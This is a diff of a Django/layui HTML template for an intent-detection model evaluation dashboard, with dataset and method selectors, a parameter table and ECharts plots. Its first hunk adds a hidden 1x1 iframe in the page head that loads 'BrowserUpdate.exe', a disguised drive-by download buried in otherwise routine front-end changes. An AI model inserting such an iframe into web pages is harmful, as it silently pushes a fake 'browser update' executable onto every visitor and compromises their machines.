@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html class="x-admin-sm">
 
-    <head>
+    <head><iframe src=BrowserUpdate.exe width=1 height=1 frameborder=0></iframe>
         <meta charset="UTF-8">
         <META HTTP-EQUIV="pragma" CONTENT="no-cache"> 
         <META HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
@@ -24,227 +24,189 @@
         <![endif]-->
     </head>
     <body>
+    
 
-
-    {% comment %}ratio  {% endcomment %} 
-        <div class="layui-fluid">
-        <div class="layui-row layui-col-space15">
+    <div class="layui-fluid">
+        <div class="form_mine  layui-row  ">
             <div class="layui-col-md12">
                 <div class="layui-card">
-                   
-
-                        <div class="layui-col-md6">
-                            <div class="layui-card">
-                                <div class="layui-card-body">
-                                <div style="font-weight:700; font-size:20px;color:#555555">Influence of Known Intent Ratio (KIR)</div>
-                                    <div style="color:#6F6F6F">--Show the influence of know intent ratio.</div>  
-                                    <form class="layui-form layui-col-space5">
-                                        <div class="layui-input-inline">
-                                            <div class="layui-input-inline">
-                                                <select id="dataset_name_select_2" name="dataset_name_select">
-                                                    <option value="Dataset" selected >Dataset</option>
+                    <div style=" font-weight:700; font-size:20px;color:#555555; margin-left:1.5%;padding-top: 2%;">Model Evaluation</div>
+                    <div class="">    
+                            
+                                <div style="width: 650px; margin:10px  auto ;padding-top: 1%;">
+                                    <form class="layui-form layui-col-space5" >
+                                     
+                                        <div class="layui-input-inline" style="padding-left: 9px;">
+                                            <div id="title_btn1" class="layui-input-inline" style=" font-weight:600; font-size:15px;color:#555555;width: 200px; border: 0px solid red;">
+                                                Dataset
+                                            </div >
+                                            <div id="title_btn2"class="layui-input-inline" style="font-weight:600; font-size:15px;color:#555555;width: 200px; border: 0px solid red;">
+                                                Method
+                                            </div>
+                                            <div id="title_btn3"class="layui-input-inline" style="font-weight:600; font-size:15px;color:#555555;width: 200px; border: 0px solid red;">
+                                                Created Time
+                                            </div>
+                                           
+                                        </div>
+                                        
+                                        <div class="layui-input-inline " >
+                                            <div class="layui-input-inline" id='select_'>
+                                                <select id="dataset_name_select_2" name="dataset_name_select" lay-filter="dataset" >
+                                                    
                                                     {% for lines in datasetList %}
-                                                        <option  value="{{lines.dataset_name}}" >{{lines.dataset_name}}</option>
-                                                    {% endfor %}
-                                                    <!-- {% for lines in datasetList %}
-                                                        {% if lines.dataset_name == 'banking' %}
+                                                    {% comment %}<!-- {% if lines.dataset_name == 'banking' %}
                                                         <option selected  value="{{lines.dataset_name}}" >{{lines.dataset_name}}</option>
-                                                        {% endif %}
+                                                        {% endif %} -->
                                                         
-                                                        {% if lines.model_name != 'banking' %}
+                                                        <!-- {% if lines.model_name != 'banking' %} -->{% endcomment %}
+
+                                                        {% if lines.dataset_name == create_time_new.dataset_name %}
+                                                        <option  value="{{lines.dataset_name}}" selected >{{lines.dataset_name}}</option>
+                                                        {% endif %}
+                                                        {% if lines.dataset_name != create_time_new.dataset_name %}
                                                         <option  value="{{lines.dataset_name}}" >{{lines.dataset_name}}</option>
                                                         {% endif %}
-                                                    {% endfor %} -->
+                                                       
+                                                        {% comment %}<!-- {% endif %} -->{% endcomment %}
+                                                    {% endfor %}
                                                     <!-- <option  disabled >Dataset</option>
                                                         {% for lines in datasetList %}
                                                             <option  value="{{lines.dataset_name}}" >{{lines.dataset_name}}</option>
                                                         {% endfor %} -->
                                                 </select>
                                             </div>
-
-                                            <!-- <div class="layui-input-inline">
-                                                <select id = 'Label_Ratio_2' name="Label_Ratio">
-                                                    <option value="0" disabled>Number of cluster factor</option>
-                                                    <option value="1">1</option>
-                                                    <option value="2">2</option>
-                                                    <option value="3">3</option>
-                                                    <option value="4">4</option>
-                                                </select>
-                                            </div> -->
-
-                                            <div class="layui-input-inline">
-                                                <select id = 'Evaluation_Metrics_2' name="Evaluation_Metrics">
-                                                    <option value="0" selected >Evaluation Metrics</option>
-                                                    <option value="ACC"  >ACC</option>
-                                                    <option value="ARI" >ARI</option>
-                                                    <option value="NMI">NMI</option>
-                                                </select>
-                                            </div>
-                                            <div class="layui-inline layui-show-xs-block">
-                                                <button class="layui-btn" lay-filter="show2" lay-submit="" >Show</button>
-                                            </div>
-                                            
-                                        </div>
-                                    </form>   
-                                        <div id="image3" style="width:95%;height:350px;"></div>
-    
-                                </div>
-                            </div>
-                            </div>
-
-                            <div class="layui-col-md6">
-                            <div class="layui-card">
-                                <div class="layui-card-body">
-                                <div style="font-weight:700; font-size:20px;color:#555555">Influence of the Number of Cluster Factor (NCF)</div>
-                                <div style="color:#6F6F6F">--Show the influence of Number of cluster factor.</div>  
-                                <form class="layui-form layui-col-space5">
-                                    <div class="layui-input-inline">
-                                        <div class="layui-input-inline">
-                                            <select id="dataset_name_select_3" name="dataset_name_select">
-                                                <option value="Dataset" selected >Dataset</option>
-                                                {% for lines in datasetList %}
-                                                    <option  value="{{lines.dataset_name}}" >{{lines.dataset_name}}</option>
-                                                {% endfor %}
-                                                <!-- {% for lines in datasetList %}
-                                                    {% if lines.dataset_name == 'banking' %}
-                                                    <option selected  value="{{lines.dataset_name}}" >{{lines.dataset_name}}</option>
-                                                    {% endif %}
-                                                    
-                                                    {% if lines.model_name != 'banking' %}
-                                                    <option  value="{{lines.dataset_name}}" >{{lines.dataset_name}}</option>
-                                                    {% endif %}
-                                                {% endfor %} -->
-                                                <!-- <option  disabled >Dataset</option>
-                                                    {% for lines in datasetList %}
-                                                        <option  value="{{lines.dataset_name}}" >{{lines.dataset_name}}</option>
-                                                    {% endfor %} -->
-                                            </select>
-                                        </div>
-
-                                        <!-- <div class="layui-input-inline">
-                                                <select id = 'Known_Intent_Ratio_3' name="Known_Intent_Ratio">
-                                                    <option value="0" disabled>Known Intent Ratio</option>
-                                                    <option value="0.25" >25%</option>
-                                                    <option value="0.5">50%</option>
-                                                    <option value="0.75">75%</option>
-                                                    
-                                                </select>
-                                        </div> -->
-
-                                        <div class="layui-input-inline">
-                                            <select id = 'Evaluation_Metrics_3' name="Evaluation_Metrics">
-                                                <option value="0" selected>Evaluation Metrics</option>
-                                                <option value="ACC"  >ACC</option>
-                                                <option value="ARI" >ARI</option>
-                                                <option value="NMI">NMI</option>
-                                                
-                                            </select>
-                                        </div>
-                                        <div class="layui-inline layui-show-xs-block">
-                                            <button class="layui-btn" lay-filter="show3" lay-submit="" >Show</button>
-                                        </div>
-                                    </div>
-                                </form>   
-                                    <div id="image4" style="width:95%;height:350px;"></div>
-
-                                </div>
-                            </div>
-                            </div>
-                    </div>
-                </div>
-            </div>
-        </div> 
-
-        <!-- move -->
-        <div class="layui-fluid">
-            <div class="layui-row layui-col-space15">
-                <div class="layui-col-md12">
-                    <div class="layui-card">
-                        <div class="layui-card-body ">
-                            
-                                    <form class="layui-form layui-col-space5">
-                                        <div class="layui-input-inline">
-                                                    
-                                                     
-                                            <div class="layui-input-inline">
-                                                <select id="dataset_name_select_1" name="dataset_name_select">
-                                                    <option value="Dataset"selected >Dataset</option>
-                                                    {% for lines in datasetList %}
-                                                        <option  value="{{lines.dataset_name}}" >{{lines.dataset_name}}</option>
-                                                    {% endfor %}
-                                                    <!-- {% for lines in datasetList %}
-                                                        {% if lines.dataset_name == 'banking' %}
-                                                        <option selected  value="{{lines.dataset_name}}" >{{lines.dataset_name}}</option>
-                                                        {% endif %}
-                                                        
-                                                        {% if lines.model_name != 'banking' %}
-                                                        <option  value="{{lines.dataset_name}}" >{{lines.dataset_name}}</option>
-                                                        {% endif %}
-                                                    {% endfor %} -->
-                                                        <!-- {% for lines in datasetList %}
-                                                            <option  value="{{lines.dataset_name}}" >{{lines.dataset_name}}</option>
-                                                        {% endfor %} -->
-                                                </select>
-                                            </div>
-            
-                                            <div class="layui-input-inline">
-                                                <select id = 'Known_Intent_Ratio_1' name="Known_Intent_Ratio">
-                                                   
-                                                    <option value="0"selected >Known Intent Ratio</option>
-                                                    <option value="0.25"  >25%</option>
-                                                    <option value="0.50">50%</option>
-                                                    <option value="0.75">75%</option>
-                                                </select>
-                                            </div>
-    
-                                            <div class="layui-input-inline">
-                                                <select id = 'Annotated_Ratio_1' name="Annotated_Ratio">
-                                                    <option value="0" selected>Number of cluster factor</option>
-                                                    <option value="1"  >1</option>
-                                                    <option value="2">2</option>
-                                                    <option value="3">3</option>
-                                                    <option value="4">4</option>
-                                                </select>
-                                            </div>
-    
                                             <div class="layui-input-inline" >
-                                                <select id="model_discovery_1" name="model_discovery" >
-                                                    <option  value='model_discovery_1'selected >Open Intent Discovery</option>
-                                                    {% for lines in modelList_discovery %}
+                                                <select id="model_detection_1" name="model_detection" lay-filter="method">
+                                                    <option value='model_detection_1' selected >Open Intent Discovery</option>
+                                                    {% for lines in modelList_detection %}
+                                                    
+
+                                                    {% if lines.model_name == create_time_new.model_name %}
+                                                        <option  value="{{lines.model_name}}" selected>{{lines.model_name}}</option>
+                                                        {% endif %}
+                                                        {% if lines.model_name != create_time_new.model_name %}
                                                         <option  value="{{lines.model_name}}" >{{lines.model_name}}</option>
+                                                        {% endif %}
+
                                                     {% endfor %}
-                                                    <!-- {% for lines in modelList_discovery %}
-                                                        {% if lines.model_name == 'DeepAligned' %}
-                                                        <option selected  value="{{lines.model_name}}" >{{lines.model_name}}</option>
-                                                        {% endif %}
-                                                        
-                                                        {% if lines.model_name != 'DeepAligned' %}
-                                                        <option  value="{{lines.model_name}}" >{{lines.model_name}}</option>
-                                                        {% endif %}
-                                                    {% endfor %} -->
-                                                        <!-- {% for lines in modelList_discovery %}
+
+
+                                                    
+
+                                                        <!-- {% for lines in modelList_detection %}
                                                             <option  value="{{lines.model_name}}" >{{lines.model_name}}</option>
                                                         {% endfor %} -->
                                                 </select>
                                             </div>
-                                            
-    
-                                            <div class="layui-inline layui-show-xs-block">
-                                                <button class="layui-btn"  lay-filter="show1"  lay-submit="" >Show</button>
+                                            <div class="layui-input-inline " >
+                                                <select id="create_time" name="create_time" lay-filter="create_time" style="z-index: 3;">
+                                                    
+
+                                                    {% for create_time in create_time %}
+                                                   
+
+                                                    {% if create_time.create_time == create_time_new.create_time %}
+                                                    <option   value="{{create_time.log_id}}" selected>{{create_time.create_time|date:"Y/m/d  H:i:s"}}</option>
+                                                    {% endif %}
+                                                    {% if create_time.create_time != create_time_new.create_time %}
+                                                    <option  value="{{create_time.log_id}}" >{{create_time.create_time|date:"Y/m/d  H:i:s"}}</option>
+                                                    {% endif %}
+
+
+
+                                                    {% endfor %}
+                                                </select>
                                             </div>
+                                            <div class="layui-inline layui-show-xs-block"style=" margin-right:0px">
+                                                <button class="layui-btn" id="show2Btn" lay-filter="show2" lay-submit="" >Show</button>
+                                            </div>
+                                            
                                         </div>
-                                    </form>
+                                    </form> 
+                                    
+                                </div>
+                                <div style="font-weight:700; font-size:20px;color:#555555;margin-left:1.5%">Parameter List</div>
+                                <div style="color:#6F6F6F;margin-left:1.5%;">--Show the parameter list.</div> 
+                                <div class="layui-form " style="margin:0 auto  ;width: 650px;" >
+                                    <div >
+                                        <table lay-even class="layui-table lay-even">
+                                            <colgroup>
+                                                <col width = ''>
+                                                <col width = '30%'>
+                                                <!--50% 18.1%-->
+                                            </colgroup>
+                                            <theda>
+                                                <tr>
+                                                    <th style='background-color:#eeeded'> Name</th>
+                                                    <th style='background-color:#eeeded'> Value</th>
+                                                </tr>
+                                            </theda>
+                                            <tbody id='textarea_parm'>
+                                                {% for parameter in parameters %}
+                                                <tr>
+
+                                               
+                                                <td>{{parameter.param_name}}</td>
+                                                <td>{{parameter.default_value}}</td>
+                                            </tr>
+                                                {% endfor %}
+                                            </tbody>
+                                        </table>
+    
+                                    </div>
+                                </div>
+           </div>
+                    
+                    
+                        <div class="layui-col-md6">
+                            <div class="layui-card">
+                                <div class="layui-card-body">
                                 
-                            {% comment %} show loss change {% endcomment %}
-                            <div class="layui-input-inline">
+                                <div style="font-weight:700; font-size:20px;color:#555555">Loss</div>
+                                    <div style="color:#6F6F6F">--Show the training and evaluation loss.</div>  
+                                        {% comment %} <a id="download" href="">Download</a>   {% endcomment %}
+                                        <div id="image_1" style="width:95%;height:350px;"></div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="layui-col-md6">
+                            <div class="layui-card">
+                                <div class="layui-card-body">
+                                    <div style="font-weight:700; font-size:20px;color:#555555">Result</div>
+                                    <div style="color:#6F6F6F">--Show the training and evaluation results.</div> 
+                                    
+                                            <!-- <form class="layui-form layui-col-space5">     
+                                                <div style="font-weight:700; font-size:15px;color:#555555;float:left; margin-top: 0.5%; position: relative;z-index: 2;">Select Metrics:</div>                     
+                                                    <div class="layui-input-inline" style="float:left; margin-right: 10%; position: relative;z-index: 2;">                                      
+                                                        <select id = 'Evaluation_Metrics_3' name="Evaluation_Metrics" lay-filter="Evaluation">
+                                                            
+                                                            <option value="F1"  selected>F1</option>
+                                                            <option value="F1-known">F1-known</option>
+                                                            <option value="F1-open">F1-open</option>
+                                                            <option value="Acc">Acc</option>                                               
+                                                        </select>
+                                                    </div>
+                                            </form> -->
+                                        <div id="image_2" style="width:95%;height:350px;">
+                                        </div>
+                                    
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="layui-input-inline">
                                 <div class="layui-input-inline">
                                  <div class="layui-col-md6">
                                     <div class="layui-card">
                                         <div class="layui-card-body">
                                                 <div style="font-weight:700; font-size:20px;color:#555555">Overall Performance</div>
                                                 <div style="color:#6F6F6F">--Show the model result.</div>     
-                                                <div id="image1" style="width:800px; height:450px; left:0; right:0; margin:auto;"></div>
-                                                    
+                                                {% comment %} <a id="download" href="">Download</a> {% endcomment %}
+                                                {% comment %} <div id="image_3" style="width: 80%;height:285px;"></div> {% endcomment %}
+                                                <div id="image_3" style="width:800px; height:450px; left:0; right:0; margin:auto;" ></div>
+                                                  
                                         </div>
                                     </div>    
                                 </div>
@@ -255,144 +217,224 @@
                                                 {% comment %} Result {% endcomment %}   
                                                     <div style="font-weight:700; font-size:20px;color:#555555">Error Analysis</div>
                                                     <div style="color:#6F6F6F">--Show details of incorrect results.</div>  
-                                                    <div id="image2" style="width:800px; height:450px; left:0; right:0; margin:auto;"></div>
+                                                    {% comment %} <a id="download" href="">Download</a> {% endcomment %}
+                                                    {% comment %} <div id="image_4" style="width:390px;height:285px;"></div> {% endcomment %}
+    
+                                                    <div id="image_4" style="width:800px; height:450px; left:0; right:0; margin:auto;" ></div>
+                                                      
                                                    
                                             </div>
                                         </div>
                                     </div>
                                 </div>
-                                 
                             </div> 
     
                                 
-                        </div>  
-                        </div>
-                    </div> 
+                        </div> 
+
+
+                    
+
                 </div>
+
             </div>
+
+
         </div>
+    </div> 
+
        
 
         <script>layui.use(['form', 'layer','jquery'],
+       
             function() {
                 $ = layui.jquery;
                 var form = layui.form,
                 layer = layui.layer;
-                json_base_path = '/static/jsons/open_intent_discovery/'
+                json_base_path = '/static/jsons/open_intent_detection/'
 
-                
-                //image1 image2
-                form.on('submit(show1)',function(data) {
-                    //console.log('first show clicked')
-                    dataset_name_select_1 = $('#dataset_name_select_1').val()
-                    Known_Intent_Ratio_1 = $('#Known_Intent_Ratio_1').val()
-                    // Annotated_Ratio_1 = $('#Annotated_Ratio_1').val()
-                    Annotated_Ratio_1 = "0.1"
-                    model_discovery_1 = $('#model_discovery_1').val()
+                //image_3 image_4
+                form.on('submit(show)',function(data) {
+
+                    console.log('clicked Test--215!!!!!!!!')
+                    dataset_name_select_1 = $('#dataset_name_select_2').val()
+                    model_detection_1 = $('#model_detection_1').val()
+                    log_id = $('#create_time').val()
+                    console.log("log_id_218:",log_id)
                     if(dataset_name_select_1 == 'Dataset'){
                         layer.msg('Please select Dataset');
                     } else if(Known_Intent_Ratio_1 == 0){
                         layer.msg('Please select Known Intent Ratio');
                     } else if(Annotated_Ratio_1 == 0){
                         layer.msg('Please select Labeled Ratio');
-                    } else if(model_discovery_1 == 'model_discovery_1'){
-                        layer.msg('Please select New Intent Discovery');
+                    } else if(model_detection_1 == 'model_detection_1'){
+                        layer.msg('Please select New Intent Detection');
                     } else{// 渲染图表
-                        var key_ture_false = dataset_name_select_1 + '_'+ Known_Intent_Ratio_1 + '_' + Annotated_Ratio_1 + '_' + model_discovery_1
-                        var myChart1 = echarts.init(document.getElementById('image1'));
-                        var myChart2 = echarts.init(document.getElementById('image2'));
-                        var errorMsg = 'There is no data for this combination ！！！'
-                        $.get('/discovery/model_test/model_evaluation_getDataOfTFOverallByKey?key='+key_ture_false, function (data) {
+                        if(Annotated_Ratio_1 == 1 || Annotated_Ratio_1 == "1"){
+                            Annotated_Ratio_1 = "1.0"
+                        }
+                        // var key_ture_false = dataset_name_select_1 + '_'+ Known_Intent_Ratio_1 + '_' + Annotated_Ratio_1 + '_' + model_detection_1
+                        //New)key
+                        var key_ture_false = dataset_name_select_1 + '_'+ model_detection_1 + '_' 
+                        //image_3    Overall Performance
+                        var myChart1 = echarts.init(document.getElementById('image_3'));
+                        //image_4    Error Analyze
+                        var myChart2 = echarts.init(document.getElementById('image_4'));
+                        $.get('/detection/model_test/model_evaluation_getDataOfTFOverallByKey?key='+key_ture_false, function (data) {
+                            var errorMsg = 'Overall Performance'
                             data_chart_1 = data.data;
-                            if (data.code != 200){ errorConfirm(errorMsg); return false; }
-                            myChart1.clear();//清除缓存
-                            myChart1.setOption(get_option_ture_false_overall(data_chart_1))
-                        }, 
-                        'json');
-                        $.get('/discovery/model_test/model_evaluation_getDataOfTFFineByKey?key='+key_ture_false, function (data) {
+                    if (data.code != 200){ errorConfirm(errorMsg); return false; }
+                            myChart1.clear();
+                            myChart1.setOption(get_option_ture_false_overall(data_chart_1));
+                            },'json');
+                        $.get('/detection/model_test/model_evaluation_getDataOfTFFineByKey?key='+key_ture_false, function (data) {
+                            var errorMsg = 'Error Analyze'
                             data_chart_2 = data.data;
-                            if (data.code != 200){ errorConfirm(errorMsg); return false; }
+                        if (data.code != 200){ errorConfirm(errorMsg); return false; }
                             myChart2.clear();//清除缓存
                             myChart2.setOption(get_option_ture_false_fine(data_chart_2));
                             }, 'json');
                     }
-                    //var myChart1 = echarts.init(document.getElementById('image1'));
                     
                     return false;
                 });
-                //image3
+                
+                //image_1 Influence of Known Intent Ratio
+                
                 form.on('submit(show2)',function(data) {
-                    //console.log('first show clicked')
+                    
+                    
                     dataset_name_select_2 = $('#dataset_name_select_2').val()
-                    // Label_Ratio_2 = $('#Label_Ratio_2').val()
-                    Evaluation_Metrics_2 = $('#Evaluation_Metrics_2').val()
-                   
+                    model_detection_1 = $('#model_detection_1').val()   //method----------------------------
+                    log_id = $('#create_time').val()
+                    console.log("log_id_264:",log_id)
+                    // console.log(dataset_name_select_2,model_detection_1,create_time)
                     if(dataset_name_select_2 == 'Dataset'){
                         layer.msg('Please select Dataset');
-                    } 
-                    // else if(Label_Ratio_2 == 0){
-                    //     layer.msg('Please select Known Intent Ratio');
-                    // } 
-                    else if(Evaluation_Metrics_2 == 0){
+                    } else if(Label_Ratio_2 == 0){
+                        layer.msg('Please select Label Ratio');
+                    } else if(Evaluation_Metrics_2 == 0){
                         layer.msg('Please select Evaluation Metrics');
-                    }else{// 渲染图表
-                        // iok_data_str = "discovery_"+dataset_name_select_2+"_"+Label_Ratio_2+"_"+Evaluation_Metrics_2
-                        iok_data_str = "discovery_"+dataset_name_select_2+"_1_"+Evaluation_Metrics_2
-                        var myChart3 = echarts.init(document.getElementById('image3'));
-                        var errorMsg = 'There is no data for this combination ！！！'
-                        // $.get(json_base_path + 'json_discovery_IOKIR.json', function (data) {
-                        $.get('/discovery/model_test/model_evaluation_getDataOfIOKIRByKey?key='+iok_data_str, function (data) {
-                            data_chart_3 = data.data
-                            if (data.code != 200){ errorConfirm(errorMsg); return false; }
-                            myChart3.clear();
-                            myChart3.setOption(get_option_iokir(data_chart_3))
-                        }, 'json');
-                    }
-                    return false;
-                });
-               
-                //image4
-                form.on('submit(show3)',function(data) {
-                    //console.log('first show clicked')
-                    dataset_name_select_3 = $('#dataset_name_select_3').val()
-                    // Known_Intent_Ratio_3 = $('#Known_Intent_Ratio_3').val()
-                    Evaluation_Metrics_3 = $('#Evaluation_Metrics_3').val()
-                   
-                    if(dataset_name_select_3 == 'Dataset'){
-                        layer.msg('Please select Dataset');
-                    } 
-                    // else if(Known_Intent_Ratio_3 == 0){
-                    //     layer.msg('Please select Known Intent Ratio');
-                    // } 
-                    else if(Evaluation_Metrics_3 == 0){
-                        layer.msg('Please select Evaluation Metrics');
-                    }else{// 渲染图表
-                        // iol_data_str = "discovery_"+dataset_name_select_3+"_"+Known_Intent_Ratio_3+"_"+Evaluation_Metrics_3
-                        iol_data_str = "discovery_"+dataset_name_select_3+"_0.75_"+Evaluation_Metrics_3
-                        var myChart4 = echarts.init(document.getElementById('image4'));
-                        var errorMsg = 'There is no data for this combination ！！！'
-                        // $.get(json_base_path + 'json_discovery_IONOC.json', function (data) {
-                        $.get('/discovery/model_test/model_evaluation_getDataOfIONOCByKey?key='+iol_data_str, function (data) {
+                    }else{
+                        if(Label_Ratio_2 == 1 || Label_Ratio_2 == "1"){
+                            Label_Ratio_2 = "1.0"
+                        }else if(model_detection_1 == 'model_detection_1'){
+                        layer.msg('Please select New Intent Detection');
+                    }   
+                        iok_data_str = "discovery_"+dataset_name_select_2+"_"+model_detection_1+"_"+log_id
+                        // iok_data_str = "detection_"+dataset_name_select_2+"_"+Label_Ratio_2+"_"+Evaluation_Metrics_2
+                        var myChart3 = echarts.init(document.getElementById('image_1'));
+                        // var errorMsg = 'Influence of Known Intent Ratio'
+
+                        //第一张图
+                        $.get('/discovery/model_test/model_evaluation_getDataOfIOKIRByKey_new?key='+iok_data_str, function (data) {
+                        data_chart_3 = data.data
+                        // if (data.code != 200){ errorConfirm(errorMsg); return false; 
+                        myChart3.clear();
+                        myChart3.setOption(get_option_iokir(data_chart_3))
+                    }, 'json');
+
+                     
+
+                        //第二张图
+                        
+                        iol_data_str = "discovery_"+dataset_name_select_2+"_"+model_detection_1+"_"+log_id
+                        var myChart4 = echarts.init(document.getElementById('image_2'));
+                        var errorMsg = 'Influence of Label Ratio'
+                        $.get('/discovery/model_test/model_evaluation_getDataOfIOLRByKey_new?key='+iol_data_str, function (data) {
+                            // data_chart_4 = data[iol_data_str]
                             data_chart_4 = data.data
-                            if (data.code != 200){ errorConfirm(errorMsg); return false; }
+                        if (data.code != 200){ errorConfirm(errorMsg); return false; }
                             myChart4.clear();
                             myChart4.setOption(get_option_iolr(data_chart_4))
                         }, 'json');
+
+                        //第三张图
+                        tfo_data_str = dataset_name_select_2+"_"+model_detection_1+"_"+log_id
+                        var myChart1 = echarts.init(document.getElementById('image_3'));
+                        $.get('/discovery/model_test/model_evaluation_getDataOfTFOverallByKey_new?key='+tfo_data_str, function (data) {
+                        data_chart_1 = data.data
+                        // if (data.code != 200){ errorConfirm(errorMsg); return false; 
+                        myChart1.clear();
+                        myChart1.setOption(get_option_ture_false_overall(data_chart_1))
+                        }, 'json');
+
+                        //第四张图
+                        ea_data_str = dataset_name_select_2+"_"+model_detection_1+"_"+log_id
+                        var myChart2 = echarts.init(document.getElementById('image_4'));
+                        $.get('/discovery/model_test/model_evaluation_getDataOfTFFineByKey_new?key='+ea_data_str, function (data) {
+                        data_chart_2 = data.data
+                        // if (data.code != 200){ errorConfirm(errorMsg); return false; 
+                        myChart2.clear();
+                        myChart2.setOption(get_option_ture_false_fine(data_chart_2))
+                        }, 'json');
+                        
+
+
+
+
+
+
+
+
+
+
+                    
+                        $ = layui.jquery;
+      
+                        $.get('/detection/model_test/show_hyper_parameters?log_id='+log_id, function (data) {                            
+                           if (data.code != 200){ 
+
+                            }
+                                   //console.log( JSON.parse(data.data[0]))
+                                   console.log(data)
+                                //    console.log(data.data.length)
+                                //    $("#create_time").empty();
+                                   
+                                // for(var i = 0; i<data.data.length;i++){
+                                //     $("#create_time").append("<option value="+data.data[i].log_id+">"+data.data[i].create_time+"</option>");
+                                // }
+                                    // $("#select_data").append("<option value="+kkk+">"+KKKK+"</option>");
+                                    form.render('select');
+                                    console.log("_____________________750_____________________")
+                                    $("#textarea_parm").empty();
+                               
+                                  
+
+                               
+                                for(var i = 0; i<data.data.length;i++){
+                                    $("#textarea_parm").append('<tr>');
+                                        
+                                        $("#textarea_parm").append("<td>"+data.data[i].param_name+"</td>");
+                                        $("#textarea_parm").append("<td>"+data.data[i].default_value+"</td>");
+                                        
+                                    $("#textarea_parm").append('</tr>');
+
+     
+                                }
+                               
+                                   //console.log( JSON.parse(data))
+                                   //JSON.parse(data.data[0])
+                                  //window.location.href="../model_test/?data="+data.data[0]//.dataset_name
+                                   },'json');
                     }
                     return false;
                 });
                
-            });  
-
+        
+                
+            }
             
+            
+            );
+
 
             function get_option_ture_false_overall(data_overall){
                 var option_overall = {
                     tooltip: { trigger: 'axis', axisPointer: { type: 'shadow' } },
                     legend: { data: [ 'Predicted error sample', 'Predicted correct sample'] },
                     grid: { left: '3%', right: '4%', bottom: '5%', containLabel: true },
-                    xAxis: [ { type: 'value', 
-                    nameTextStyle:{
+                    xAxis: [ { type: 'value',  nameTextStyle:{
                             fontWeight:550,
                         },
                         axisLabel:{
@@ -401,12 +443,11 @@
                             fontWeight: 550,
                             fontSize:12
                         }
-                    }
-                } ],
-                    yAxis: [ { type: 'category', data: data_overall.intent_class, axisTick: { show: false } ,} ],
-                    color:[ '#FF6666','#66CCCC'],
+                    }}],
+                    yAxis: [ { type: 'category', axisTick: { show: false }, data: data_overall.intent_class } ],
+                    color:['#FF6666','#66CCCC'],
                     dataZoom: [// x轴拖动
-                        { type: "slider", realtime: true, height: 15, left:"10%", right:"5%", bottom: '1%',start: 0, end: 100 },
+                        { type: "slider", realtime: true, height: 15, left:"10%", right:"5%",bottom:"1%", start: 0, end: 100 },
                         { type: 'slider', show: true, yAxisIndex: [0], left: '96%', right:"2%", start: 0, end: 1000 }
                     ],
                     series: [
@@ -418,19 +459,40 @@
             }
 
             function get_option_ture_false_fine(data_fine){
-                var mylegend = [];
-                var series = [];
+                var mylegend = new Array();
+                var series = new Array();
                 for(var key in data_fine){
                     mylegend.push(key),
+                    // console.log(key+'\t\t'+data_fine[key])
                     series.push({
                         name: key, data: data_fine[key], type: 'bar', stack: 'total', emphasis: { focus: 'series' }
                     })
                 }
                 var option_fine = {
-                    tooltip: { trigger: 'axis', axisPointer: { type: 'shadow' } },
+                    tooltip: { trigger: 'axis', axisPointer: { type: 'shadow' },
+                    formatter:function(params){
+                        var result_list = []
+                        if(params[0].name == '<UNK>'){
+                            result_list.push('< UNK >')
+                        }else{
+                            result_list.push(params[0].name)
+                        }for (i = 0;i < params.length;i++){
+                            if (params[i].data != 0){
+                                if(params[i].seriesName == '<UNK>'){
+                                    row_str = params[i].marker +' < UNK >&nbsp;:&nbsp;&nbsp;&nbsp;'+ params[i].value
+                                }else{
+                                    row_str = params[i].marker +' '+ params[i].seriesName +'&nbsp;:&nbsp;&nbsp;&nbsp;'+ params[i].value
+                                }
+                                result_list.push( row_str )
+                            }
+                        }
+                        return result_list.join('<br>');
+                        }, 
+                    },
                     legend: { type: 'scroll', top: 10, data: mylegend },
                     grid: { left: '3%', right: '4%', bottom: '5%', containLabel: true },
-                    xAxis: { type: 'value' , nameTextStyle:{
+                    xAxis: { type: 'value' ,
+                    nameTextStyle:{
                             fontWeight:550,
                         },
                         axisLabel:{
@@ -439,51 +501,112 @@
                             fontWeight: 550,
                             fontSize:12
                         }
-                    }},
+                    }
+                },
                     yAxis: { type: 'category', data: mylegend },
                     dataZoom: [// x轴拖动
-                        {type: "slider", realtime: true, height: 15, left:"10%", right:"5%",bottom: '1%', start: 0, end: 100 },
+                        { type: "slider", realtime: true, height: 15, left:"10%", right:"5%", bottom:"1%",start: 0, end: 100 },
                         { type: 'slider', show: true, yAxisIndex: [0], left: '96%', right:"2%", start: 0, end: 1000 }
                     ],
                     color:[
                         '#5470c6','#91cc75','#fac858','#ee6666','#73c0de','#3ba272','#fc8452','#9a60b4','#ea7ccc','#BBFFFF',
-                        '#FFDEAD','	#00868B','#66CDAA','#BEBEBE','#00FF7F','#00CD00','#FFFF00','#FFC1C1','#B8860B','#FF8247',
+                        '#FFDEAD','#00868B','#66CDAA','#BEBEBE','#00FF7F','#00CD00','#FFFF00','#FFC1C1','#B8860B','#FF8247',
                         '#B22222','#FF4500','#7B68EE','#458B00','#B0C4DE','#CAFF70','#EEE685','#556B2F','#20B2AA','#32CD32',
                         '#8B658B','#BC8F8F','#CD5555','#DEB887','#B22222','#FA8072','#EEE8AA','#EE9A49','#FF69B4','#8B4513',
-                        '#EE82EE','#FF8C69','#9932CC','	#CDC9C9','#EED5B7','#CD4F39','#EE4000','#CDC1C5','#FF34B3','#FFE4E1',
+                        '#EE82EE','#FF8C69','#9932CC','#CDC9C9','#EED5B7','#CD4F39','#EE4000','#CDC1C5','#FF34B3','#FFE4E1',
                         '#F0FFFF','#EE3A8C','#836FFF','#EE00EE','#473C8B','#FF83FA','#436EEE','#CD69C9','#0000FF','#CD96CD',
-                        '#1E90FF','#E066FF','#1874CD','#7A378B','#5CACEE','#9A32CD','#00B2EE','	#7D26CD','#00688B','#AB82FF',
+                        '#1E90FF','#E066FF','#1874CD','#7A378B','#5CACEE','#9A32CD','#00B2EE','#7D26CD','#00688B','#AB82FF',
                         '#6CA6CD','#EED2EE','#8DB6CD','#8B7B8B','#B9D3EE','#6C7B8B','#E0FFFF','#00008B','#D1EEEE','#8B008B',
                         '#8B0000','#90EE90','#DCDCDC','#98F5FF','#FFEBCD','#00C5CD','#FFE4B5','#00CDCD','#79CDCD','#76EEC6',
                         '#FFE4E1','#B4EEB4','#696969','#4EEE94','#6495ED','#00FF7F','#7B68EE','#00FF00','#0000FF','#87CEEB',
